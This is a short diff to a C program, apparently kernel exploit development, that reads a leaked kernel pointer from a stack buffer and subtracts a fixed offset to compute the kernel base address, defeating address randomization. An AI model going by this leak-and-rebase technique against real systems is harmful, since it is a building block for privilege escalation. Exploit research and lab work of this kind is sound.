@@ -89,9 +89,10 @@ int main()
     );
 
     uintptr_t leak_kernel = (uintptr_t)*(void **)(stack_value + 0x108);
-
-    printf("[!] Leak Kernel: 0x%llx",leak_kernel);
-
+    uintptr_t kernel_base = leak_kernel - 0xb7b3c9; 
+    printf("[!] Leak Kernel: 0x%llx", leak_kernel);
+    printf("[!] Kernel Base: 0x%llx", kernel_base);
+    
     return 0;
 }
 
